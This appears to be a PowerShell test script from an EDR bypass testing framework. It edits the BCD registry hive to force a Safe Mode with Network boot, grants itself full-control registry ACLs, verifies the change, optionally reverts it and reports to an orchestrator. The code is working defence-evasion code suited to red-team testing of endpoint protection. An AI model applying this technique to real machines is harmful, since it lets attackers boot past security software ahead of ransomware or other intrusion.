#==============================================================================
# BP1000.4 - Safe Mode Boot Bypass via PowerShell Registry Manipulation
# EDR Bypass Testing Automation Framework
#==============================================================================
# SYNOPSIS
#   Performs EDR bypass by configuring system to boot into Safe Mode with Network
#   using PowerShell registry cmdlets to directly modify BCD registry keys, then 
#   reverts the configuration after verification.
#
# DESCRIPTION
#   This script implements BP-1000.4 technique which uses direct registry 
#   manipulation of the BCD hive to set the system to boot into Safe Mode with 
#   Network on next restart. This technique bypasses standard BCD tools by 
#   directly modifying the registry keys that control boot configuration.
#   
#   Test Flow:
#   1. Backup current boot configuration
#   2. Locate default boot object GUID via bootmgr BCD object
#   3. Execute bypass: Modify HKLM\BCD00000000\Objects\{guid}\Elements\25000080
#   4. Verify bypass was applied successfully
#   5. Revert configuration by restoring original registry state
#   6. Verify reversion was successful
#   7. Report results to orchestrator
#
# REQUIREMENTS
#   - Administrative privileges (required for BCD registry operations)
#   - Windows Vista or later (BCD registry structure)
#   - Access to HKLM\BCD00000000 registry hive
#
# EXIT CODES
#   0 = Success (bypass applied and reverted successfully)
#   1 = General failure
#   2 = Insufficient privileges
#   3 = Bypass application failed
#   4 = Bypass verification failed
#   5 = Reversion failed
#   6 = BCD registry hive not accessible
#   7 = Default boot object GUID not found
#==============================================================================

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$LogPath = "C:\EDRBypassTests\Logs",
    
    [Parameter(Mandatory=$false)]
    [switch]$SkipReversion = $false,
    
    [Parameter(Mandatory=$false)]
    [switch]$Verbose = $false
)

# Set strict mode for better error handling
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region Constants and Configuration
$TECHNIQUE_ID = "BP1000.4"
$TECHNIQUE_NAME = "Safe Mode Boot via PowerShell Registry Manipulation"
$SCRIPT_VERSION = "1.0.0"
$TIMESTAMP = Get-Date -Format "yyyyMMdd_HHmmss"
$SCRIPT_NAME = "BP1000.4-registry"

# Result constants for orchestrator communication
$RESULT_SUCCESS = "BYPASSED"
$RESULT_FAILURE = "FAILED"
$RESULT_DETECTED = "DETECTED"
$RESULT_ERROR = "ERROR"

# BCD Registry constants
$BCD_HIVE_PATH = "HKLM:\BCD00000000"
$BOOTMGR_GUID = "{9DEA862C-5CDD-4E70-ACC1-F32B344D4795}"
$DEFAULT_ENTRY_ELEMENT = "23000003"
$SAFEBOOT_ELEMENT = "25000080"

# Safeboot mode values (as 8-byte little-endian binary)
$SAFEBOOT_NETWORK_VALUE = [byte[]]@(1, 0, 0, 0, 0, 0, 0, 0)  # Network = 1
$SAFEBOOT_MINIMAL_VALUE = [byte[]]@(0, 0, 0, 0, 0, 0, 0, 0)  # Minimal = 0
$SAFEBOOT_DSREPAIR_VALUE = [byte[]]@(2, 0, 0, 0, 0, 0, 0, 0)  # DsRepair = 2
#endregion

#region Logging Functions
function Initialize-Logging {
    param([string]$LogDirectory)
    
    try {
        if (-not (Test-Path $LogDirectory)) {
            New-Item -Path $LogDirectory -ItemType Directory -Force | Out-Null
        }
        
        $global:LogFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP.log"
        $global:ResultFile = Join-Path $LogDirectory "$SCRIPT_NAME`_$TIMESTAMP`_result.json"
        
        Write-Log "=== EDR Bypass Test: $TECHNIQUE_NAME ===" -Level "INFO"
        Write-Log "Technique ID: $TECHNIQUE_ID" -Level "INFO"
        Write-Log "Script Version: $SCRIPT_VERSION" -Level "INFO"
        Write-Log "Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        Write-Log "Log File: $global:LogFile" -Level "INFO"
        Write-Log "Result File: $global:ResultFile" -Level "INFO"
        
        return $true
    }
    catch {
        Write-Error "Failed to initialize logging: $($_.Exception.Message)"
        return $false
    }
}

function Write-Log {
    param(
        [string]$Message,
        [ValidateSet("INFO", "WARN", "ERROR", "DEBUG")]
        [string]$Level = "INFO"
    )
    
    $logEntry = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"
    
    # Write to console
    switch ($Level) {
        "ERROR" { Write-Host $logEntry -ForegroundColor Red }
        "WARN"  { Write-Host $logEntry -ForegroundColor Yellow }
        "DEBUG" { if ($Verbose) { Write-Host $logEntry -ForegroundColor Gray } }
        default { Write-Host $logEntry }
    }
    
    # Write to file if available
    if ($global:LogFile) {
        try {
            Add-Content -Path $global:LogFile -Value $logEntry -Encoding UTF8
        }
        catch {
            Write-Warning "Failed to write to log file: $($_.Exception.Message)"
        }
    }
}
#endregion

#region Utility Functions
function Test-AdminPrivileges {
    try {
        $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
        $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Write-Log "Administrator privileges check: $isAdmin" -Level "DEBUG"
        return $isAdmin
    }
    catch {
        Write-Log "Failed to check administrator privileges: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Test-BcdRegistryAccess {
    try {
        Write-Log "Testing BCD registry hive access..." -Level "DEBUG"
        
        if (Test-Path $BCD_HIVE_PATH) {
            Write-Log "BCD registry hive accessible at: $BCD_HIVE_PATH" -Level "DEBUG"
            return $true
        }
        else {
            Write-Log "BCD registry hive not accessible at: $BCD_HIVE_PATH" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to test BCD registry access: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Get-DefaultBootObjectGuid {
    try {
        Write-Log "Looking up default boot object GUID..." -Level "DEBUG"
        
        # Construct path to bootmgr object's default entry element
        $bootmgrPath = "$BCD_HIVE_PATH\Objects\$BOOTMGR_GUID\Elements\$DEFAULT_ENTRY_ELEMENT"
        Write-Log "Bootmgr element path: $bootmgrPath" -Level "DEBUG"
        
        if (Test-Path $bootmgrPath) {
            # Read the Element value which contains the default boot object GUID
            $elementValue = Get-ItemProperty -Path $bootmgrPath -Name "Element" -ErrorAction SilentlyContinue
            
            if ($elementValue -and $elementValue.Element) {
                # The Element is a binary value containing the GUID
                $guidBytes = $elementValue.Element
                Write-Log "Retrieved GUID bytes: $([System.Convert]::ToHexString($guidBytes))" -Level "DEBUG"
                
                # Convert binary to GUID string
                $guid = [System.Guid]::new($guidBytes)
                $guidString = "{$($guid.ToString().ToUpper())}"
                
                Write-Log "Default boot object GUID: $guidString" -Level "INFO"
                return $guidString
            }
            else {
                Write-Log "Element value not found in bootmgr object" -Level "ERROR"
                return $null
            }
        }
        else {
            Write-Log "Bootmgr element path does not exist: $bootmgrPath" -Level "ERROR"
            return $null
        }
    }
    catch {
        Write-Log "Failed to get default boot object GUID: $($_.Exception.Message)" -Level "ERROR"
        return $null
    }
}

function Get-SafebootRegistryValue {
    param([string]$BootObjectGuid)
    
    try {
        Write-Log "Querying current safeboot registry value..." -Level "DEBUG"
        
        $safebootPath = "$BCD_HIVE_PATH\Objects\$BootObjectGuid\Elements\$SAFEBOOT_ELEMENT"
        Write-Log "Safeboot element path: $safebootPath" -Level "DEBUG"
        
        if (Test-Path $safebootPath) {
            $elementValue = Get-ItemProperty -Path $safebootPath -Name "Element" -ErrorAction SilentlyContinue
            
            if ($elementValue -and $elementValue.Element) {
                $value = $elementValue.Element
                Write-Log "Current safeboot binary value: $([System.Convert]::ToHexString($value))" -Level "DEBUG"
                
                # Convert 8-byte little-endian binary to integer
                $intValue = [System.BitConverter]::ToUInt64($value, 0)
                
                # Convert to descriptive text
                switch ($intValue) {
                    0 { $description = "minimal"; break }
                    1 { $description = "network"; break }
                    2 { $description = "dsrepair"; break }
                    default { $description = "unknown($intValue)"; break }
                }
                
                Write-Log "Current safeboot mode: $intValue ($description)" -Level "DEBUG"
                return @{
                    BinaryValue = $value
                    IntegerValue = $intValue
                    Description = $description
                    Exists = $true
                }
            }
            else {
                Write-Log "Element value not found in safeboot element" -Level "DEBUG"
                return @{ Exists = $false }
            }
        }
        else {
            Write-Log "Safeboot element path does not exist (normal boot)" -Level "DEBUG"
            return @{ Exists = $false }
        }
    }
    catch {
        Write-Log "Failed to query safeboot registry value: $($_.Exception.Message)" -Level "ERROR"
        throw
    }
}

function Set-RegistryPermissions {
    param([string]$RegistryPath)
    
    try {
        Write-Log "Setting registry permissions for: $RegistryPath" -Level "DEBUG"
        
        # Get current user identity
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $currentUserSid = $currentUser.User
        
        # Get the registry key ACL
        $acl = Get-Acl -Path $RegistryPath
        
        # Create access rule for full control
        $accessRule = New-Object System.Security.AccessControl.RegistryAccessRule(
            $currentUserSid,
            [System.Security.AccessControl.RegistryRights]::FullControl,
            [System.Security.AccessControl.InheritanceFlags]::ContainerInherit,
            [System.Security.AccessControl.PropagationFlags]::None,
            [System.Security.AccessControl.AccessControlType]::Allow
        )
        
        # Add the access rule
        $acl.SetAccessRule($accessRule)
        
        # Apply the ACL
        Set-Acl -Path $RegistryPath -AclObject $acl
        
        Write-Log "Registry permissions set successfully" -Level "DEBUG"
        return $true
    }
    catch {
        Write-Log "Failed to set registry permissions: $($_.Exception.Message)" -Level "WARN"
        Write-Log "Continuing without permission modification..." -Level "WARN"
        return $false
    }
}
#endregion

#region Test Result Functions
function Write-TestResult {
    param(
        [string]$Status,
        [string]$Message,
        [hashtable]$Details = @{}
    )
    
    $result = @{
        TechniqueId = $TECHNIQUE_ID
        TechniqueName = $TECHNIQUE_NAME
        Status = $Status
        Message = $Message
        Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        Details = $Details
        ScriptVersion = $SCRIPT_VERSION
    }
    
    try {
        $resultJson = $result | ConvertTo-Json -Depth 3
        if ($global:ResultFile) {
            Set-Content -Path $global:ResultFile -Value $resultJson -Encoding UTF8
        }
        
        Write-Log "=== TEST RESULT ===" -Level "INFO"
        Write-Log "Status: $Status" -Level "INFO"
        Write-Log "Message: $Message" -Level "INFO"
        Write-Log "Result file: $global:ResultFile" -Level "INFO"
        
        # Output for orchestrator pickup
        Write-Output "TECHNIQUE_RESULT:$Status|$Message"
        
    }
    catch {
        Write-Log "Failed to write test result: $($_.Exception.Message)" -Level "ERROR"
    }
}
#endregion

#region Main Test Functions
function Backup-OriginalState {
    param([string]$BootObjectGuid)
    
    try {
        Write-Log "Backing up original BCD registry safeboot configuration..." -Level "INFO"
        
        $originalValue = Get-SafebootRegistryValue -BootObjectGuid $BootObjectGuid
        
        $global:OriginalState = @{
            BootObjectGuid = $BootObjectGuid
            SafebootValue = $originalValue
            BackupTime = Get-Date
        }
        
        if ($originalValue.Exists) {
            Write-Log "Original safeboot value backed up: $($originalValue.IntegerValue) ($($originalValue.Description))" -Level "INFO"
        }
        else {
            Write-Log "No original safeboot value to backup (normal boot)" -Level "INFO"
        }
        
        return $true
    }
    catch {
        Write-Log "Failed to backup original state: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-BypassTechnique {
    param([string]$BootObjectGuid)
    
    try {
        Write-Log "Executing BP1000.4 registry bypass technique..." -Level "INFO"
        
        $safebootPath = "$BCD_HIVE_PATH\Objects\$BootObjectGuid\Elements\$SAFEBOOT_ELEMENT"
        Write-Log "Target registry path: $safebootPath" -Level "INFO"
        Write-Log "Setting safeboot value to: Network (1)" -Level "INFO"
        
        # Ensure the Elements directory exists
        $elementsPath = "$BCD_HIVE_PATH\Objects\$BootObjectGuid\Elements"
        if (-not (Test-Path $elementsPath)) {
            Write-Log "Creating Elements directory: $elementsPath" -Level "DEBUG"
            New-Item -Path $elementsPath -ItemType Directory -Force | Out-Null
        }
        
        # Set registry permissions if needed
        Set-RegistryPermissions -RegistryPath $elementsPath
        
        # Create the safeboot element directory if it doesn't exist
        if (-not (Test-Path $safebootPath)) {
            Write-Log "Creating safeboot element directory: $safebootPath" -Level "DEBUG"
            New-Item -Path $safebootPath -ItemType Directory -Force | Out-Null
            Set-RegistryPermissions -RegistryPath $safebootPath
        }
        
        # Set the Element value to network safe mode (1 as 8-byte little-endian binary)
        Set-ItemProperty -Path $safebootPath -Name "Element" -Value $SAFEBOOT_NETWORK_VALUE -Type Binary
        
        Write-Log "Registry bypass technique executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to execute registry bypass technique: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Error details: $($_.Exception.GetType().Name)" -Level "ERROR"
        if ($_.Exception.InnerException) {
            Write-Log "Inner exception: $($_.Exception.InnerException.Message)" -Level "ERROR"
        }
        return $false
    }
}

function Test-BypassSuccess {
    param([string]$BootObjectGuid)
    
    try {
        Write-Log "Verifying registry bypass was applied successfully..." -Level "INFO"
        
        # Small delay to ensure registry changes are persisted
        Start-Sleep -Milliseconds 500
        
        $currentValue = Get-SafebootRegistryValue -BootObjectGuid $BootObjectGuid
        
        if ($currentValue.Exists -and $currentValue.IntegerValue -eq 1) {
            Write-Log "Bypass verification successful - safeboot set to: $($currentValue.IntegerValue) ($($currentValue.Description))" -Level "INFO"
            return $true
        }
        else {
            $actualValue = if ($currentValue.Exists) { $currentValue.IntegerValue } else { "not set" }
            Write-Log "Bypass verification failed - expected '1 (network)', got '$actualValue'" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify bypass success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}

function Invoke-StateReversion {
    param([string]$BootObjectGuid)
    
    try {
        Write-Log "Reverting system to original state using registry operations..." -Level "INFO"
        
        $safebootPath = "$BCD_HIVE_PATH\Objects\$BootObjectGuid\Elements\$SAFEBOOT_ELEMENT"
        
        if ($global:OriginalState.SafebootValue.Exists) {
            # Restore original safeboot value
            $originalValue = $global:OriginalState.SafebootValue
            Write-Log "Restoring original safeboot value: $($originalValue.IntegerValue) ($($originalValue.Description))" -Level "INFO"
            
            Set-ItemProperty -Path $safebootPath -Name "Element" -Value $originalValue.BinaryValue -Type Binary
        }
        else {
            # Remove safeboot element to restore normal boot
            Write-Log "Removing safeboot element to restore normal boot" -Level "INFO"
            
            if (Test-Path $safebootPath) {
                Remove-Item -Path $safebootPath -Recurse -Force
            }
        }
        
        Write-Log "State reversion executed successfully" -Level "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to revert system state: $($_.Exception.Message)" -Level "ERROR"
        Write-Log "Error details: $($_.Exception.GetType().Name)" -Level "ERROR"
        if ($_.Exception.InnerException) {
            Write-Log "Inner exception: $($_.Exception.InnerException.Message)" -Level "ERROR"
        }
        return $false
    }
}

function Test-ReversionSuccess {
    param([string]$BootObjectGuid)
    
    try {
        Write-Log "Verifying state reversion was successful..." -Level "INFO"
        
        # Small delay to ensure registry changes are persisted
        Start-Sleep -Milliseconds 500
        
        $currentValue = Get-SafebootRegistryValue -BootObjectGuid $BootObjectGuid
        $expectedValue = $global:OriginalState.SafebootValue
        
        # Compare current state with expected state
        if ((-not $currentValue.Exists -and -not $expectedValue.Exists) -or 
            ($currentValue.Exists -and $expectedValue.Exists -and 
             [System.Convert]::ToHexString($currentValue.BinaryValue) -eq [System.Convert]::ToHexString($expectedValue.BinaryValue))) {
            
            $currentDesc = if ($currentValue.Exists) { "$($currentValue.IntegerValue) ($($currentValue.Description))" } else { "not set" }
            Write-Log "Reversion verification successful - safeboot value restored to: $currentDesc" -Level "INFO"
            return $true
        }
        else {
            $currentDesc = if ($currentValue.Exists) { "$($currentValue.IntegerValue) ($($currentValue.Description))" } else { "not set" }
            $expectedDesc = if ($expectedValue.Exists) { "$($expectedValue.IntegerValue) ($($expectedValue.Description))" } else { "not set" }
            Write-Log "Reversion verification failed - expected '$expectedDesc', got '$currentDesc'" -Level "ERROR"
            return $false
        }
    }
    catch {
        Write-Log "Failed to verify reversion success: $($_.Exception.Message)" -Level "ERROR"
        return $false
    }
}
#endregion

#region Main Execution
function main {
    try {
        Write-Host "Starting EDR Bypass Test: $TECHNIQUE_NAME" -ForegroundColor Cyan
        
        # Initialize logging
        if (-not (Initialize-Logging -LogDirectory $LogPath)) {
            Write-Error "Failed to initialize logging system"
            exit 1
        }
        
        Write-Log "=== PRE-EXECUTION CHECKS ===" -Level "INFO"
        
        # Check administrative privileges
        if (-not (Test-AdminPrivileges)) {
            $errorMsg = "Administrative privileges required for BCD registry operations"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 2
        }
        Write-Log "Administrative privileges confirmed" -Level "INFO"
        
        # Check BCD registry hive access
        if (-not (Test-BcdRegistryAccess)) {
            $errorMsg = "BCD registry hive is not accessible at $BCD_HIVE_PATH"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 6
        }
        Write-Log "BCD registry hive access confirmed" -Level "INFO"
        
        # Get default boot object GUID
        $bootObjectGuid = Get-DefaultBootObjectGuid
        if (-not $bootObjectGuid) {
            $errorMsg = "Failed to locate default boot object GUID"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 7
        }
        Write-Log "Default boot object GUID located: $bootObjectGuid" -Level "INFO"
        
        Write-Log "=== EXECUTING BYPASS TECHNIQUE ===" -Level "INFO"
        
        # Backup original state
        if (-not (Backup-OriginalState -BootObjectGuid $bootObjectGuid)) {
            $errorMsg = "Failed to backup original system state"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
            exit 1
        }
        
        # Execute bypass technique
        if (-not (Invoke-BypassTechnique -BootObjectGuid $bootObjectGuid)) {
            $errorMsg = "Failed to execute registry bypass technique"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 3
        }
        
        # Verify bypass was applied
        if (-not (Test-BypassSuccess -BootObjectGuid $bootObjectGuid)) {
            $errorMsg = "Registry bypass technique failed verification"
            Write-Log $errorMsg -Level "ERROR"
            Write-TestResult -Status $RESULT_FAILURE -Message $errorMsg
            exit 4
        }
        
        Write-Log "=== BYPASS TECHNIQUE SUCCESSFUL ===" -Level "INFO"
        
        # Revert state unless explicitly skipped
        if (-not $SkipReversion) {
            Write-Log "=== REVERTING SYSTEM STATE ===" -Level "INFO"
            
            if (-not (Invoke-StateReversion -BootObjectGuid $bootObjectGuid)) {
                $errorMsg = "Failed to revert system state"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 5
            }
            
            if (-not (Test-ReversionSuccess -BootObjectGuid $bootObjectGuid)) {
                $errorMsg = "State reversion failed verification"
                Write-Log $errorMsg -Level "ERROR"
                Write-TestResult -Status $RESULT_ERROR -Message $errorMsg -Details @{
                    BypassSuccessful = $true
                    ReversionFailed = $true
                }
                exit 5
            }
            
            Write-Log "System state successfully reverted" -Level "INFO"
        }
        else {
            Write-Log "State reversion skipped as requested" -Level "WARN"
        }
        
        # Report success
        $successMsg = "BP1000.4 registry bypass technique executed and verified successfully"
        Write-Log $successMsg -Level "INFO"
        Write-TestResult -Status $RESULT_SUCCESS -Message $successMsg -Details @{
            BootObjectGuid = $bootObjectGuid
            OriginalSafebootValue = $global:OriginalState.SafebootValue
            BypassApplied = $true
            BypassVerified = $true
            StateReverted = (-not $SkipReversion)
            BcdHivePath = $BCD_HIVE_PATH
            BootmgrGuid = $BOOTMGR_GUID
        }
        
        Write-Log "=== TEST COMPLETED SUCCESSFULLY ===" -Level "INFO"
        Write-Log "End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -Level "INFO"
        
        exit 0
        
    }
    catch {
        $errorMsg = "Unhandled exception in main execution: $($_.Exception.Message)"
        Write-Log $errorMsg -Level "ERROR"
        Write-Log "Stack trace: $($_.ScriptStackTrace)" -Level "ERROR"
        Write-TestResult -Status $RESULT_ERROR -Message $errorMsg
        exit 1
    }
}

# Execute main function
main
#endregion